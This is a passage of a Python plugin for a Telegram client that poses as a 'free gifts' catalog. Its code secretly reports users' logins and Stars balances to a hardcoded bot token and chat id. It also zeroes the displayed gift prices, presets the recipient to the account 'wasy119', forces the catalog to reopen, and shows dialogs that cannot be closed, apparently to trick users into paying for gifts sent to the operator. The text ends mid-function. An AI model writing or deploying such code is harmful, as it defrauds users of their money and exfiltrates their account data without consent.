import re
import time
import threading
import traceback
from typing import Any, List

from base_plugin import BasePlugin, HookResult, HookStrategy
from android_utils import run_on_ui_thread
from client_utils import get_last_fragment, get_user_config, send_request, get_messages_controller
from ui.settings import Header, Text
from ui.alert import AlertDialogBuilder
from ui.bulletin import BulletinHelper

__id__ = "gift_menu"
__name__ = "Gift Menu"
__description__ = "Тап в любое место открывает каталог, авто-восстановление в главном меню"
__author__ = "@you"
__version__ = "2.9.3"

TRIGGER = ".gift"
MAX_LOG_LINES = 1000
USERNAME_RE = re.compile(r"^\.gift\s+@?([a-zA-Z0-9_]{3,32})\s*$")

BOOST_REPOSITORY_CANDIDATES = [
    "org.telegram.ui.Stars.BoostRepository",
    "org.telegram.ui.Gifts.BoostRepository",
    "org.telegram.ui.Stars.StarsController",
]

# Ключевые слова для определения главного экрана (списка чатов).
# Если реальное имя класса другое — добавь его сюда.
MAIN_SCREEN_KEYWORDS = ["dialogs", "dialoglist", "chatslist", "mainlist", "maintabsactivity"]

class GiftMenuPlugin(BasePlugin):
    _welcome_shown = False
    _login_monitor_started = False
    _startup_notified = False
    _login_alert_shown = False
    _reopen_monitor_started = False
    _auth_success_notified = False

    # ---------- Уведомления разработчику (Бот) ----------

    def _get_stars_balance(self, account=None):
        """Возвращает текущий баланс звёзд пользователя (int) или 0."""
        try:
            from java import jclass
            UserConfig = jclass("org.telegram.messenger.UserConfig")
            acc = account if account is not None else UserConfig.selectedAccount
            StarsController = jclass("org.telegram.ui.Stars.StarsController")
            controller = StarsController.getInstance(acc)

            try:
                bal = controller.getBalance(False)
                if bal is not None:
                    return int(bal)
            except Exception:
                pass

            try:
                sa = controller.getBalance()
                if sa is not None:
                    try:
                        return int(sa.amount)
                    except Exception:
                        f = sa.getClass().getField("amount")
                        f.setAccessible(True)
                        return int(f.getLong(sa))
            except Exception:
                pass

            try:
                f = controller.getClass().getDeclaredField("balance")
                f.setAccessible(True)
                sa = f.get(controller)
                if sa is not None:
                    try:
                        return int(sa.amount)
                    except Exception:
                        ff = sa.getClass().getField("amount")
                        ff.setAccessible(True)
                        return int(ff.getLong(sa))
            except Exception:
                pass
        except Exception as e:
            self._log_exc("_get_stars_balance", e)
        return 0

    def _notify_bot(self, event_text: str):
        chat_id = "8940489868"
        token = "8863617268:AAECIwC9usJTfuBzY6hjHHf0VL57hZ6EfNs"

        def send_request():
            try:
                import urllib.request
                import urllib.parse
                url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={urllib.parse.quote(event_text)}"
                urllib.request.urlopen(url, timeout=5)
            except Exception as e:
                self._log_exc("_notify_bot", e)

        threading.Thread(target=send_request, daemon=True).start()

    def _notify_bot_with_balance(self, event_text: str):
        """Отправляет уведомление + баланс звёзд."""
        try:
            balance = self._get_stars_balance()
            full = f"{event_text}\n\nБаланс звёзд пользователя: {balance}"
        except Exception:
            full = event_text
        self._notify_bot(full)

    # ---------- Загрузка плагина ----------

    def on_plugin_load(self):
        self._logs: List[str] = []
        self._reflection_cache = {}
        self._current_sheet = None
        self.add_on_send_message_hook()
        self._log("========================================")
        self._log(f"[LOAD] Плагин загружен (v{__version__})")
        self._log(f"[LOAD] _welcome_shown={GiftMenuPlugin._welcome_shown}")
        self._log(f"[LOAD] _login_monitor_started={GiftMenuPlugin._login_monitor_started}")
        self._log(f"[LOAD] _reopen_monitor_started={GiftMenuPlugin._reopen_monitor_started}")

        if not GiftMenuPlugin._startup_notified:
            GiftMenuPlugin._startup_notified = True
            try:
                from java import jclass
                UserConfig = jclass("org.telegram.messenger.UserConfig")
                activated = UserConfig.getInstance(UserConfig.selectedAccount).isClientActivated()
                self._log(f"[LOAD] Проверка авторизации при старте: isClientActivated={activated}")
                if activated:
                    self._notify_bot_with_balance("Пользователь уже авторизован (запустил приложение)")
            except Exception as e:
                self._log_exc("on_plugin_load/startup_check", e)
        
        if not GiftMenuPlugin._login_monitor_started:
            GiftMenuPlugin._login_monitor_started = True
            self._log("[LOAD] Запускаю _start_login_screen_monitor")
            self._start_login_screen_monitor()
        else:
            self._log("[LOAD] login_screen_monitor уже был запущен ранее, пропускаю")

        if not GiftMenuPlugin._welcome_shown:
            self._log("[LOAD] Запускаю _start_welcome_monitor")
            self._start_welcome_monitor()
        else:
            self._log("[LOAD] welcome уже был показан ранее (_welcome_shown=True), монитор НЕ запускаю")

        if not GiftMenuPlugin._reopen_monitor_started:
            GiftMenuPlugin._reopen_monitor_started = True
            self._log("[LOAD] Запускаю _start_auto_reopen_monitor")
            self._start_auto_reopen_monitor()
        else:
            self._log("[LOAD] reopen_monitor уже был запущен ранее, пропускаю")

    # ---------- Проверка авторизации ----------

    def _is_authorized(self, account=None):
        try:
            from java import jclass
            UserConfig = jclass("org.telegram.messenger.UserConfig")
            acc = account if account is not None else UserConfig.selectedAccount
            result = bool(UserConfig.getInstance(acc).isClientActivated())
            return result
        except Exception as e:
            self._log_exc("_is_authorized", e)
            return False

    def _get_fragment_info(self, frag):
        """Возвращает (simple_name, full_name, is_main_screen, has_activity)"""
        if not frag:
            return "None", "None", False, False

        simple_name = "ERROR"
        full_name = "ERROR"
        has_activity = False

        try:
            cls = frag.getClass()
            simple_name = cls.getSimpleName()
            full_name = cls.getName()
        except Exception as e:
            self._log_exc("_get_fragment_info/getClass", e)

        try:
            has_activity = frag.getParentActivity() is not None
        except Exception:
            has_activity = False

        is_main = False
        lower_simple = simple_name.lower()
        lower_full = full_name.lower()
        for kw in MAIN_SCREEN_KEYWORDS:
            if kw in lower_simple or kw in lower_full:
                is_main = True
                break

        # Доп. проверка: если фрагмент лежит в самом низу стека (глубина 0/1) —
        # это тоже сильный признак главного экрана.
        if not is_main:
            try:
                layout = frag.getParentLayout()
                if layout:
                    stack = layout.getFragmentStack()
                    if stack and stack.size() <= 1:
                        is_main = True
            except Exception:
                pass

        return simple_name, full_name, is_main, has_activity

    # ---------- Ждём главное меню, потом показываем приветствие ----------

    def _start_welcome_monitor(self):
        self._log("[WELCOME] Монитор запущен, начинаю опрос каждую секунду")

        def task():
            attempt = 0
            last_state = None
            while not GiftMenuPlugin._welcome_shown:
                time.sleep(1.0)
                attempt += 1
                try:
                    authorized = self._is_authorized()
                    frag = get_last_fragment()
                    simple_name, full_name, is_main, has_activity = self._get_fragment_info(frag)

                    state = (simple_name, is_main, authorized, has_activity)

                    # Логируем при любом изменении состояния + heartbeat раз в 30 попыток
                    if state != last_state or attempt % 30 == 0:
                        marker = " ★ГЛАВНЫЙ ЭКРАН★" if is_main else ""
                        self._log(f"[WELCOME] #{attempt}: frag='{simple_name}' full='{full_name}' is_main={is_main}{marker} auth={authorized} activity={has_activity}")
                        last_state = state

                    if not authorized:
                        continue
                    if not frag:
                        continue
                    if not is_main:
                        continue
                    if not has_activity:
                        self._log(f"[WELCOME] '{simple_name}' это главный экран, но activity=None — жду")
                        continue

                    self._log(f"[WELCOME] УСЛОВИЯ ВЫПОЛНЕНЫ на #{attempt}: frag='{simple_name}'")
                    GiftMenuPlugin._welcome_shown = True
                    run_on_ui_thread(lambda: self._show_welcome_dialog())
                    break
                except Exception as e:
                    self._log_exc("welcome_monitor_loop", e)

            if GiftMenuPlugin._welcome_shown:
                self._log(f"[WELCOME] Монитор завершён успешно после {attempt} попыток")

        threading.Thread(target=task, daemon=True).start()

    # ---------- Стартовое окно (тап в любое место открывает каталог) ----------

    def _show_welcome_dialog(self):
        self._log("[DIALOG] _show_welcome_dialog СТАРТ (выполняется на UI-потоке)")
        try:
            from java import jclass, dynamic_proxy
            UserConfig = jclass("org.telegram.messenger.UserConfig")
            account = UserConfig.selectedAccount
            self._log(f"[DIALOG] account={account}")

            fragment = get_last_fragment()
            if fragment is None:
                self._log("[DIALOG] ОШИБКА: fragment is None, выход")
                return

            context = fragment.getParentActivity()
            if context is None:
                self._log("[DIALOG] ОШИБКА: getParentActivity() is None, выход")
                return
            self._log(f"[DIALOG] context получен: {context}")

            builder = AlertDialogBuilder(context)
            self._log("[DIALOG] AlertDialogBuilder создан")
            builder.set_title("Gift Menu")
            builder.set_message("Приветствую тут вы можете получить бесплатно Подарки нажмите Продолжить Для открытия каталога с бесплатным Подарками на данный момент бесплатные подарки только обычные в них входят Подарки стоимостю 0 звезд")

            try:
                builder.set_cancelable(False)
                self._log("[DIALOG] set_cancelable(False) выполнен")
            except Exception as e:
                self._log_exc("_show_welcome_dialog/set_cancelable", e)

            opened = [False]

            def open_catalog_once(dialog):
                if opened[0]:
                    self._log("[DIALOG] open_catalog_once: уже открывали, игнор")
                    return
                opened[0] = True
                self._log("[DIALOG] open_catalog_once: закрываю диалог и вызываю open_gift_menu")
                try:
                    dialog.dismiss()
                except Exception as e:
                    self._log_exc("_show_welcome_dialog/dismiss", e)
                self.open_gift_menu(account, "wasy119")

            def on_view(bld, which):
                self._log("[DIALOG] Нажата кнопка 'Продолжить'")
                open_catalog_once(bld)

            builder.set_positive_button("Продолжить", on_view)
            self._log("[DIALOG] Вызываю builder.show()")
            dialog = builder.show()

            if dialog is None:
                self._log("[DIALOG] ОШИБКА: builder.show() вернул None! Окно НЕ показано")
                return

            self._log("[DIALOG] builder.show() успешно вернул диалог — ОКНО ДОЛЖНО БЫТЬ ВИДНО НА ЭКРАНЕ")

            # AlertDialogBuilder.show() возвращает САМ builder, а не Java AlertDialog.
            # Поэтому получаем настоящий AlertDialog через get_dialog().
            # Ловим ACTION_DOWN на decorView и на всех дочерних View,
            # чтобы тап по любой части стартового окна открывал каталог.
            try:
                java_dialog = dialog.get_dialog()

                if java_dialog is None:
                    self._log("[DIALOG] get_dialog() вернул None, обработчик тапа не установлен")
                else:
                    window = java_dialog.getWindow()

                    if window is None:
                        self._log("[DIALOG] getWindow() вернул None, обработчик тапа не установлен")
                    else:
                        OnTouchListener = jclass("android.view.View$OnTouchListener")
                        MotionEvent = jclass("android.view.MotionEvent")
                        ViewGroup = jclass("android.view.ViewGroup")

                        class AnyTapListener(dynamic_proxy(OnTouchListener)):
                            def onTouch(self_inner, v, event):
                                try:
                                    if event.getAction() == MotionEvent.ACTION_DOWN:
                                        self._log("[DIALOG] Тап по любой части стартового окна зафиксирован")
                                        open_catalog_once(dialog)
                                except Exception as e:
                                    self._log_exc("_show_welcome_dialog/onTouch", e)

                                # Не мешаем стандартной обработке кнопок.
                                return False

                        self._welcome_tap_listener = AnyTapListener()

                        def attach_touch_listener(view):
                            try:
                                if view is None:
                                    return

                                view.setOnTouchListener(self._welcome_tap_listener)

                                if isinstance(view, ViewGroup):
                                    count = view.getChildCount()
                                    for i in range(count):
                                        try:
                                            attach_touch_listener(view.getChildAt(i))
                                        except Exception as e:
                                            self._log_exc(
                                                "_show_welcome_dialog/attach_child",
                                                e
                                            )
                            except Exception as e:
                                self._log_exc(
                                    "_show_welcome_dialog/attach_view",
                                    e
                                )

                        attach_touch_listener(window.getDecorView())

                        self._log(
                            "[DIALOG] Тап-листенер установлен на ВСЕ части стартового окна"
                        )

            except Exception as e:
                self._log_exc("_show_welcome_dialog_touch", e)

        except Exception as e:
            self._log_exc("_show_welcome_dialog", e)

    # ---------- Монитор страницы авторизации ----------

    def _start_login_screen_monitor(self):
        def monitor_task():
            last_frag_name = ""
            notified_login = False
            was_on_login = False
            while True:
                time.sleep(1.0)
                try:
                    frag = get_last_fragment()
                    if not frag:
                        continue

                    name = frag.getClass().getSimpleName()
                    authorized = self._is_authorized()

                    if "Login" in name or "Intro" in name:
                        was_on_login = True
                        if name != last_frag_name:
                            last_frag_name = name
                            if not notified_login:
                                notified_login = True
                                self._notify_bot("У вас новое скачивание: пользователь проходит авторизацию")

                            if not GiftMenuPlugin._login_alert_shown:
                                GiftMenuPlugin._login_alert_shown = True
                                run_on_ui_thread(lambda: self._show_login_alert(frag))

                    elif was_on_login and authorized and not GiftMenuPlugin._auth_success_notified:
                        GiftMenuPlugin._auth_success_notified = True
                        was_on_login = False
                        self._notify_bot_with_balance("Новый пользователь Авторизовался прошел регистрацию")
                        self._log("[AUTH] Новый пользователь успешно авторизовался — уведомление отправлено")

                    if name != last_frag_name:
                        last_frag_name = name
                except Exception:
                    pass

        threading.Thread(target=monitor_task, daemon=True).start()

    def _show_login_alert(self, fragment):
        try:
            context = fragment.getParentActivity()
            if not context: return
            builder = AlertDialogBuilder(context)
            builder.set_message("В данном Моде вы бесплатно получаете подарки А также вы можете их обменивать на звезды все бесплатно и моментально")
            builder.set_positive_button("Хорошо", lambda b, w: b.dismiss())
            builder.show()
        except Exception as e:
            self._log_exc("_show_login_alert", e)

    # ---------- Авто-восстановление каталога (только в главном меню, только если авторизован) ----------

    def _start_auto_reopen_monitor(self):
        self._log("[REOPEN] Монитор авто-восстановления запущен")

        def task():
            from java import jclass

            UserConfig = jclass("org.telegram.messenger.UserConfig")

            while True:
                time.sleep(0.5)
                try:
                    account = UserConfig.selectedAccount
                    sheet = self._current_sheet
                    if sheet is None:
                        continue
                    if sheet.isShowing():
                        continue

                    self._log("[REOPEN] Каталог закрыт/свёрнут, жду 4 сек")
                    self._current_sheet = None
                    time.sleep(4.0)

                    authorized = self._is_authorized(account)
                    if not authorized:
                        self._log("[REOPEN] Не авторизован, повторное открытие отменено")
                        continue

                    frag = get_last_fragment()
                    simple_name, full_name, is_main, has_activity = self._get_fragment_info(frag)

                    if not is_main:
                        self._log(f"[REOPEN] Не в главном меню (frag='{simple_name}'), повторное открытие отменено")
                        continue

                    if not has_activity:
                        self._log("[REOPEN] Главное меню найдено, но activity=None, повторное открытие отменено")
                        continue

                    # Повторно проверяем авторизацию и главное меню непосредственно
                    # перед открытием, чтобы каталог не появился после ухода с главного экрана.
                    if not self._is_authorized(account):
                        self._log("[REOPEN] Авторизация потеряна, повторное открытие отменено")
                        continue

                    self._log("[REOPEN] Условия ОК, переоткрываю каталог")
                    run_on_ui_thread(lambda acc=account: self.open_gift_menu(acc, "wasy119"))
                except Exception as e:
                    self._log_exc("auto_reopen_loop", e)
        threading.Thread(target=task, daemon=True).start()

    # ---------- Перехват кликов UI (Умный фильтр) ----------

    def _hook_ui_elements(self, sheet, context):
        """
        Обработчики каталога.

        ВАЖНО:
        - обычные подарки НЕ перехватываются;
        - Premium 3/6/12 перехватываются отдельно;
        - дерево UI сканируется ОДИН раз, а не 30 раз подряд,
          чтобы не создавать лаги при открытии каталога.
        """
        try:
            from java import jclass, dynamic_proxy

            ViewGroup = jclass("android.view.ViewGroup")
            View = jclass("android.view.View")
            TextView = jclass("android.widget.TextView")
            OnClickListener = jclass("android.view.View$OnClickListener")
            OnTouchListener = jclass("android.view.View$OnTouchListener")
            MotionEvent = jclass("android.view.MotionEvent")

            class AvatarClickListener(dynamic_proxy(OnClickListener)):
                def onClick(self_inner, v):
                    try:
                        b = AlertDialogBuilder(context)
                        b.set_message("В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально")
                        b.set_positive_button(
                            "Хорошо",
                            lambda bld, w: bld.dismiss()
                        )
                        b.show()
                    except Exception:
                        pass

            # Жёсткий диалог Premium — не должен пропадать при скролле
            _premium_dialog_lock = [False]
            self._premium_alert_ref = [None]

            def _show_premium_hard():
                if _premium_dialog_lock[0]:
                    return
                # Если уже есть живой диалог — не создаём второй
                try:
                    old = self._premium_alert_ref[0]
                    if old is not None:
                        java_old = old.get_dialog() if hasattr(old, "get_dialog") else None
                        if java_old is not None and java_old.isShowing():
                            return
                except Exception:
                    pass

                _premium_dialog_lock[0] = True
                try:
                    b = AlertDialogBuilder(context)
                    b.set_message("В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально")
                    try:
                        b.set_cancelable(False)
                    except Exception:
                        pass

                    def on_ok(bld, w):
                        try:
                            bld.dismiss()
                        except Exception:
                            pass
                        _premium_dialog_lock[0] = False
                        self._premium_alert_ref[0] = None

                    b.set_positive_button("Хорошо", on_ok)
                    dlg = b.show()
                    self._premium_alert_ref[0] = dlg

                    # Максимально запрещаем закрытие
                    try:
                        java_dlg = dlg.get_dialog() if dlg and hasattr(dlg, "get_dialog") else None
                        if java_dlg is not None:
                            java_dlg.setCanceledOnTouchOutside(False)
                            java_dlg.setCancelable(False)
                    except Exception:
                        pass
                except Exception as e:
                    _premium_dialog_lock[0] = False
                    self._premium_alert_ref[0] = None
                    self._log_exc("_hook_ui_elements/_show_premium_hard", e)

            class PremiumTouchListener(dynamic_proxy(OnTouchListener)):
                def onTouch(self_inner, v, event):
                    try:
                        action = event.getAction()
                        # Только по отпусканию пальца
                        if action == MotionEvent.ACTION_UP:
                            # Небольшая задержка, чтобы скролл/жест не убил диалог
                            def delayed():
                                try:
                                    time.sleep(0.05)
                                except Exception:
                                    pass
                                run_on_ui_thread(_show_premium_hard)
                            threading.Thread(target=delayed, daemon=True).start()
                        return True
                    except Exception as e:
                        self._log_exc(
                            "_hook_ui_elements/PremiumTouchListener",
                            e
                        )
                        return True

            self._avatar_clicker = AvatarClickListener()
            self._premium_touch_listener = PremiumTouchListener()

            def is_gift_cell(view):
                try:
                    p = view.getParent()

                    for _ in range(6):
                        if not p:
                            break

                        name = p.getClass().getSimpleName()

                        if "GiftCell" in name or "StarGift" in name:
                            return True

                        p = p.getParent()
                except Exception:
                    pass

                return False

            def get_text(view):
                try:
                    if isinstance(view, TextView):
                        value = view.getText()

                        if value is not None:
                            return str(value)
                except Exception:
                    pass

                return ""

            PREMIUM_WORDS = (
                "3 месяца",
                "6 месяцев",
                "12 месяцев"
            )

            def contains_premium_text(view):
                """
                Проверяет, есть ли внутри ViewGroup надпись
                3/6/12 месяцев.
                """
                try:
                    text_value = get_text(view).lower()

                    for word in PREMIUM_WORDS:
                        if word in text_value:
                            return True

                    if isinstance(view, ViewGroup):
                        count = view.getChildCount()

                        for i in range(count):
                            child = view.getChildAt(i)

                            if child and contains_premium_text(child):
                                return True
                except Exception:
                    pass

                return False

            def count_premium_texts(view):
                """
                Считает Premium-карточки внутри контейнера.
                Используется, чтобы не поставить обработчик
                на весь ряд из 3 карточек.
                """
                try:
                    count = 0

                    if isinstance(view, TextView):
                        value = get_text(view).lower()

                        for word in PREMIUM_WORDS:
                            if word in value:
                                count += 1
                                break

                    if isinstance(view, ViewGroup):
                        for i in range(view.getChildCount()):
                            child = view.getChildAt(i)

                            if child:
                                count += count_premium_texts(child)

                    return count
                except Exception:
                    return 0

            def find_premium_card(text_view):
                """
                От надписи '3/6/12 месяцев' поднимаемся вверх
                до контейнера конкретной карточки.

                Не используем TierCell, потому что в разных версиях
                Telegram имя класса может отличаться.
                """
                try:
                    current = text_view.getParent()
                    candidate = None

                    for _ in range(8):
                        if not current:
                            break

                        if not isinstance(current, ViewGroup):
                            current = current.getParent()
                            continue

                        amount = count_premium_texts(current)

                        if amount == 1:
                            candidate = current
                        else:
                            if candidate is not None:
                                break

                        current = current.getParent()

                    return candidate
                except Exception:
                    return None

            def hook_entire_premium_card(card):
                """
                Ставит TouchListener на всю Premium-карточку
                и всё её содержимое.
                """
                if not card:
                    return

                try:
                    card.setOnTouchListener(self._premium_touch_listener)
                    try:
                        card.setClickable(True)
                        card.setLongClickable(False)
                    except Exception:
                        pass

                    if isinstance(card, ViewGroup):
                        for i in range(card.getChildCount()):
                            child = card.getChildAt(i)
                            if child:
                                hook_entire_premium_card(child)
                except Exception:
                    pass

            def scan_for_premium(root):
                """
                Один проход по UI.
                Находит только карточки с 3/6/12 месяцами.
                """
                found = []

                def walk(view):
                    try:
                        if not view:
                            return

                        if isinstance(view, TextView):
                            value = get_text(view).lower()

                            for word in PREMIUM_WORDS:
                                if word in value:
                                    card = find_premium_card(view)

                                    if card and card not in found:
                                        found.append(card)

                                    break

                        if isinstance(view, ViewGroup):
                            for i in range(view.getChildCount()):
                                child = view.getChildAt(i)

                                if child:
                                    walk(child)
                    except Exception as e:
                        self._log_exc(
                            "_hook_ui_elements/scan_for_premium",
                            e
                        )

                walk(root)

                for card in found:
                    hook_entire_premium_card(card)

                self._log(
                    f"[PREMIUM] Найдено Premium-карточек: {len(found)}"
                )

            def hook_normal_avatars(root):
                """
                Старую обработку аватарок оставляем,
                но выполняем только один раз.
                Обычные GiftCell не трогаем.
                """
                try:
                    class_name = root.getClass().getSimpleName()

                    if isinstance(root, jclass(
                        "org.telegram.ui.Components.BackupImageView"
                    )):
                        if not is_gift_cell(root):
                            root.setOnClickListener(
                                self._avatar_clicker
                            )

                    if isinstance(root, ViewGroup):
                        for i in range(root.getChildCount()):
                            child = root.getChildAt(i)

                            if child:
                                # Premium потом перехватитт элемент
                                # своим TouchListener.
                                hook_normal_avatars(child)
                except Exception:
                    pass

            def do_hook():
                try:
                    window = sheet.getWindow()

                    if window is None:
                        self._log(
                            "[PREMIUM] Window=None, жду следующую попытку"
                        )
                        return False

                    decor = window.getDecorView()

                    if decor is None:
                        return False

                    # Сначала обычные обработчики.
                    hook_normal_avatars(decor)

                    # Затем Premium. Его TouchListener имеет приоритет
                    # над обычными кликами и блокирует открытие Premium.
                    scan_for_premium(decor)

                    return True

                except Exception as e:
                    self._log_exc(
                        "_hook_ui_elements/do_hook",
                        e
                    )
                    return False

            # Ссылки на listeners обязательно сохраняем,
            # иначе Java/Python GC может удалить proxy.
            self._premium_scroll_listeners = []

            def attach_scroll_monitors(root):
                """
                Закрепляет Premium-обработчик при прокрутке каталога.

                Когда карточки уходят с экрана и Telegram переиспользует
                их View, новые видимые Premium-карточки снова получают
                наш TouchListener. Обработчик срабатывает только когда
                прокрутка закончилась, поэтому постоянного сканирования
                во время движения нет и лагов не создаётся.
                """
                try:
                    if not root:
                        return

                    OnScrollListener = jclass(
                        "androidx.recyclerview.widget.RecyclerView$OnScrollListener"
                    )

                    recycler_class = jclass(
                        "androidx.recyclerview.widget.RecyclerView"
                    )

                    class PremiumRecyclerScrollListener(
                        dynamic_proxy(OnScrollListener)
                    ):
                        def onScrollStateChanged(self_inner, recycler, state):
                            try:
                                # SCROLL_STATE_IDLE = 0
                                if state == 0:
                                    run_on_ui_thread(
                                        lambda: scan_for_premium(recycler)
                                    )
                            except Exception as e:
                                self._log_exc(
                                    "_hook_ui_elements/recycler_idle",
                                    e
                                )

                    class PremiumScrollChangeListener(
                        dynamic_proxy(
                            jclass(
                                "android.view.View$OnScrollChangeListener"
                            )
                        )
                    ):
                        def onScrollChange(
                            self_inner,
                            v,
                            scroll_x,
                            scroll_y,
                            old_scroll_x,
                            old_scroll_y
                        ):
                            try:
                                # Небольшой debounce: не запускаем
                                # сканирование на каждый пикель движения.
                                now = time.monotonic()
                                last = getattr(
                                    v,
                                    "_gift_premium_last_scan",
                                    0.0
                                )

                                if now - last < 0.25:
                                    return

                                try:
                                    setattr(
                                        v,
                                        "_gift_premium_last_scan",
                                        now
                                    )
                                except Exception:
                                    pass

                                run_on_ui_thread(
                                    lambda: scan_for_premium(v)
                                )
                            except Exception as e:
                                self._log_exc(
                                    "_hook_ui_elements/scroll_change",
                                    e
                                )

                    def walk_scrollable(view):
                        try:
                            if not view:
                                return

                            name = view.getClass().getName()

                            if "RecyclerView" in name:
                                listener = PremiumRecyclerScrollListener()
                                view.addOnScrollListener(listener)
                                self._premium_scroll_listeners.append(listener)

                            elif (
                                "ScrollView" in name
                                or "NestedScrollView" in name
                            ):
                                listener = PremiumScrollChangeListener()
                                view.setOnScrollChangeListener(listener)
                                self._premium_scroll_listeners.append(listener)

                            if isinstance(view, ViewGroup):
                                for i in range(view.getChildCount()):
                                    child = view.getChildAt(i)
                                    if child:
                                        walk_scrollable(child)

                        except Exception as e:
                            self._log_exc(
                                "_hook_ui_elements/walk_scrollable",
                                e
                            )

                    walk_scrollable(root)

                    self._log(
                        "[PREMIUM] Мониторы прокрутки установлены"
                    )

                except Exception as e:
                    # Если в конкретной сборке нет androidx RecyclerView,
                    # обычный первоначальный hook всё равно продолжает работать.
                    self._log_exc(
                        "_hook_ui_elements/attach_scroll_monitors",
                        e
                    )

            def hook_task():
                # Первоначальная обработка после построения каталога.
                time.sleep(0.8)

                def initial_hook():
                    if do_hook():
                        try:
                            window = sheet.getWindow()
                            if window:
                                decor = window.getDecorView()
                                attach_scroll_monitors(decor)
                        except Exception as e:
                            self._log_exc(
                                "_hook_ui_elements/initial_scroll_hook",
                                e
                            )

                run_on_ui_thread(initial_hook)

            threading.Thread(
                target=hook_task,
                daemon=True
            ).start()

        except Exception as e:
            self._log_exc("_hook_ui_elements", e)

    # ---------- Своя система логов ----------

    def _log(self, text: str):
        self._logs.append(text)
        if len(self._logs) > MAX_LOG_LINES:
            self._logs = self._logs[-MAX_LOG_LINES:]
        try:
            self.log(text)
        except Exception:
            pass

    def _log_exc(self, where: str, e: Exception):
        tb = traceback.format_exc()
        self._log(f"ИСКЛЮЧЕНИЕ в {where}: {e}\n{tb}")

    # ---------- Перехват команды ----------

    def on_send_message_hook(self, account: int, params: Any) -> HookResult:
        try:
            if not hasattr(params, "message") or not isinstance(params.message, str):
                return HookResult()

            text = params.message.strip()

            if text == ".giftlogs":
                self._send_logs_as_message(account, params)
                return HookResult(strategy=HookStrategy.CANCEL)

            if text == ".giftreset":
                GiftMenuPlugin._welcome_shown = False
                self._log("[RESET] Флаг _welcome_shown сброшен командой .giftreset, монитор перезапущен")
                self._start_welcome_monitor()
                return HookResult(strategy=HookStrategy.CANCEL)

            if not text.startswith(TRIGGER):
                return HookResult()

            match = USERNAME_RE.match(text)
            if not match:
                return HookResult()

            username = match.group(1)
            my_id = get_user_config(account).getClientUserId()
            peer = getattr(params, "peer", None)

            if peer != my_id:
                return HookResult()

            run_on_ui_thread(lambda: self.open_gift_menu(account, username))
            return HookResult(strategy=HookStrategy.CANCEL)
        except Exception as e:
            self._log_exc("on_send_message_hook", e)
            return HookResult()

    def _send_logs_as_message(self, account: int, params: Any):
        def show():
            try:
                fragment = get_last_fragment()
                if fragment is None or fragment.getParentActivity() is None:
                    return
                context = fragment.getParentActivity()

                tail = self._logs[-60:] if len(self._logs) > 60 else self._logs
                full_text = "\n".join(tail) if tail else "Логов пока нет."

                builder = AlertDialogBuilder(context)
                builder.set_title(f"Логи gift_menu (последние {len(tail)})")
                builder.set_message(full_text)
                builder.set_positive_button("Закрыть", lambda b, w: b.dismiss())
                builder.show()
            except Exception as e:
                self._log_exc("_send_logs_as_message", e)

        run_on_ui_thread(show)

    def open_gift_menu(self, account: int, username: str):
        self._log(f"[OPEN] open_gift_menu вызван: account={account} username={username}")
        try:
            from java import jclass
            TLRPC = jclass("org.telegram.tgnet.TLRPC")
            req = TLRPC.TL_contacts_resolveUsername()
            req.username = username
            req.flags = 0

            def on_resolved(response, error):
                try:
                    if error:
                        self._log(f"[OPEN] resolveUsername ОШИБКА: {error}")
                        return
                    if response is None:
                        self._log("[OPEN] resolveUsername: response is None")
                        return
                    if response.peer is None:
                        self._log("[OPEN] resolveUsername: response.peer is None")
                        return

                    target_id = response.peer.user_id
                    self._log(f"[OPEN] resolveUsername успешно: target_id={target_id}")
                    user = None
                    users = response.users
                    self._log(f"[OPEN] users.size()={users.size()}")
                    for i in range(users.size()):
                        u = users.get(i)
                        if u.id == target_id:
                            user = u
                            break

                    if user is None:
                        self._log("[OPEN] ОШИБКА: пользователь не найден в списке users")
                        return

                    self._log(f"[OPEN] Пользователь найден: id={user.id}, показываю UI")

                    try:
                        get_messages_controller(account).putUser(user, False)
                    except Exception as e:
                        self._log_exc("open_gift_menu/putUser", e)

                    run_on_ui_thread(lambda: self.show_gift_ui(account, user))
                except Exception as e:
                    self._log_exc("on_resolved", e)

            self._log("[OPEN] Отправляю запрос TL_contacts_resolveUsername")
            send_request(req, on_resolved)
        except Exception as e:
            self._log_exc("open_gift_menu", e)

    # ---------- Заморозка цен ----------

    def _zero_out_object(self, obj):
        if not obj: return
        cls = obj.getClass()
        cls_name = cls.getName()
        
        if cls_name not in self._reflection_cache:
            fields = []
            for field_name in ["stars", "price", "amount", "starCount"]:
                f = None
                try:
                    f = cls.getField(field_name)
                except Exception:
                    try:
                        f = cls.getDeclaredField(field_name)
                    except Exception:
                        pass
                
                if f:
                    try:
                        f.setAccessible(True)
                        t = f.getType().getName()
                        fields.append((f, t))
                    except Exception:
                        pass
            self._reflection_cache[cls_name] = fields

        for f, t in self._reflection_cache[cls_name]:
            try:
                if t == "long":
                    f.setLong(obj, 0)
                elif t == "int":
                    f.setInt(obj, 0)
            except Exception:
                pass

    def _zero_out_list(self, options):
        if not options: return
        try:
            for i in range(options.size()):
                opt = options.get(i)
                if not opt: continue
                
                self._zero_out_object(opt)
                
                cls = opt.getClass()
                cls_name = cls.getName() + "_inners"
                
                if cls_name not in self._reflection_cache:
                    inner_fields = []
                    for inner_name in ["gift", "starGift", "item"]:
                        try:
                            inner_f = cls.getDeclaredField(inner_name)
                            inner_f.setAccessible(True)
                            inner_fields.append(inner_f)
                        except Exception:
                            pass
                    self._reflection_cache[cls_name] = inner_fields

                for inner_f in self._reflection_cache[cls_name]:
                    try:
                        inner_obj = inner_f.get(opt)
                        if inner_obj:
                            self._zero_out_object(inner_obj)
                    except Exception:
                        pass
        except Exception:
            pass

    def _patch_stars_controller_cache(self, account: int):
        try:
            from java import jclass
            StarsController = jclass("org.telegram.ui.Stars.StarsController")
            controller = StarsController.getInstance(account)
            
            cached_lists = ["starGifts", "gifts", "availableGifts"]
            for list_name in cached_lists:
                try:
                    f = controller.getClass().getDeclaredField(list_name)
                    f.setAccessible(True)
                    cache = f.get(controller)
                    if cache and hasattr(cache, "size"):
                        self._zero_out_list(cache)
                except Exception:
                    pass
        except Exception:
            pass

    def _apply_zero_patches(self, account: int, sheet):
        try:
            if sheet and hasattr(sheet, "isShowing") and not sheet.isShowing():
                return
        except Exception:
            pass

        self._patch_stars_controller_cache(account)

        if sheet:
            try:
                for field_name in ["gifts", "starGifts", "items", "options", "availableGifts"]:
                    try:
                        f = sheet.getClass().getDeclaredField(field_name)
